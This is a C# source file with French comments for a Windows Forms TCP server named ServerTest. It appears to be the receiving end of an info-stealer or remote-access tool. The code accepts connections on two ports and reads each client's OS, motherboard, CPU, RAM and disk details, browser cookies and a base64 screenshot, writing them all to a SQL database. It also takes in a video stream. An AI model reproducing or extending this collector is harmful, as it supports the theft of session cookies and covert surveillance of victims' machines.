using System;
using System.Data.SqlClient;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace ServerTest
{
    public class Server
    {
        private Socket textSocket;
        private Socket videoSocket;

        private bool isRunning;
        private TextBox infoTextBox;

        private SqlConnection cnx;
        private string currentTime;

        public Server(int port, int videoPort, TextBox textBox)
        {
            textSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            IPEndPoint iep = new IPEndPoint(IPAddress.Parse("0.0.0.0"), port);
            textSocket.Bind(iep);

            videoSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            IPEndPoint videoEndPoint = new IPEndPoint(IPAddress.Any, videoPort);
            videoSocket.Bind(videoEndPoint);

            isRunning = false;
            infoTextBox = textBox;
        }

        public void Start()
        {
            isRunning = true;
            textSocket.Listen(5);
            videoSocket.Listen(5);
            AddTextToInfoTextBox("Serveur démarré. En attente de connexions...");

            Task.Run(() => AcceptTextClients()); // Démarrer la méthode AcceptClients dans un nouveau thread
            Task.Run(() => AcceptVideoClients());
            AddTextToInfoTextBox("Client Connected...");
        }

        private void AcceptTextClients()
        {

            while (isRunning)
            {
                Socket clientSocket = textSocket.Accept();
                Task.Run(() => Communication(clientSocket)); // Utilisation de Task.Run pour éviter le blocage de l'interface

            }
        }

        private void AcceptVideoClients()
        {
            while (isRunning)
            {
                Socket clientSocket = videoSocket.Accept();
                Task.Run(() => ReceiveVideoData(clientSocket));
            }
        }

        private void Communication(Socket clientSocket)
        {
            NetworkStream ns = new NetworkStream(clientSocket);
            StreamReader reader = new StreamReader(ns);
            int i = 0;

            try
            {
                while (true)
                {
                    // Lire les données envoyées par le client
                    string os = reader.ReadLine();
                    string motherboard = reader.ReadLine();
                    string processor = reader.ReadLine();
                    string ram = reader.ReadLine();
                    string disk = reader.ReadLine();
                    string cookies = reader.ReadLine();

                    // Lire la capture d'écran envoyée par le client
                    string screenshotBase64 = reader.ReadLine();
                    byte[] screenshot = Convert.FromBase64String(screenshotBase64);

                    // Stocker les données dans la base de données
                    InsertDataIntoDatabase(os, motherboard, processor, ram, disk, screenshot, cookies);
                    i++;
                    currentTime = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
                    AddTextToInfoTextBox(" Les Données "+ i + " reçues et stockées dans la base de données a " + currentTime);
                    //MessageBox.Show("Données reçues et stockées dans la base de données.");
                }
            }
            catch (Exception ex)
            {
                AddTextToInfoTextBox("Erreur lors de la lecture des données: " + ex.Message);
            }
            finally
            {
                reader.Close();
                ns.Close();
                clientSocket.Close();
            }
        }

        private void ReceiveVideoData(Socket clientSocket)
        {
            NetworkStream ns = new NetworkStream(clientSocket);

            try
            {
                byte[] videoBuffer = ReadVideoStream(ns);

                // Traiter la vidéo ici

                AddTextToInfoTextBox("Vidéo reçue et traitée avec succès");
            }
            catch (Exception ex)
            {
                AddTextToInfoTextBox("Erreur lors de la réception de la vidéo : " + ex.Message);
            }
            finally
            {
                ns.Close();
                clientSocket.Close();
            }
        }

        private byte[] ReadVideoStream(NetworkStream ns)
        {
            using (MemoryStream ms = new MemoryStream())
            {
                byte[] buffer = new byte[1024];
                int bytesRead;
                while ((bytesRead = ns.Read(buffer, 0, buffer.Length)) > 0)
                {
                    ms.Write(buffer, 0, bytesRead);
                }
                return ms.ToArray();
            }
        }


        private void InsertDataIntoDatabase(string os, string motherboard, string processor, string ram, string disk, byte[] screenshot, string cookies)
        {
            // Connexion à la base de données et insertion des données
            string query = "INSERT INTO receivedData1 (OS, motherboard, processeur, ram, hardDisk, captureData,cookies, receivedAt) " +
                           "VALUES (@OS, @Motherboard, @Processor, @RAM, @Disk, @Screenshot,@cookies, @ReceivedAt)";

            using (SqlConnection cnx = Program.GetSqlConnection())
            {
                using (SqlCommand command = new SqlCommand(query, cnx))
                {
                    command.Parameters.AddWithValue("@OS", os);
                    command.Parameters.AddWithValue("@Motherboard", motherboard);
                    command.Parameters.AddWithValue("@Processor", processor);
                    command.Parameters.AddWithValue("@RAM", ram);
                    command.Parameters.AddWithValue("@Disk", disk);
                    command.Parameters.AddWithValue("@Screenshot", screenshot);
                    command.Parameters.AddWithValue("@cookies", cookies);
                    command.Parameters.AddWithValue("@ReceivedAt", DateTime.Now); // Utilisation de la date et l'heure actuelles

                    cnx.Open();
                    command.ExecuteNonQuery();
                }
            }
        }


        // Méthode pour ajouter du texte à la TextBox infoTextBox
        private void AddTextToInfoTextBox(string text)
        {
            // Vérifier si l'appel provient d'un thread différent
            if (infoTextBox.InvokeRequired)
            {
                // Exécuter le code dans le thread approprié en utilisant Invoke
                infoTextBox.Invoke(new MethodInvoker(() => AddTextToInfoTextBox(text)));
            }
            else
            {
                // Ajouter le texte à la TextBox infoTextBox
                infoTextBox.AppendText(text + Environment.NewLine);
            }
        }

        public void Stop()
        {
            isRunning = false;
            textSocket.Close();
            AddTextToInfoTextBox("Fermeture de la connexion");
        }
    }
}
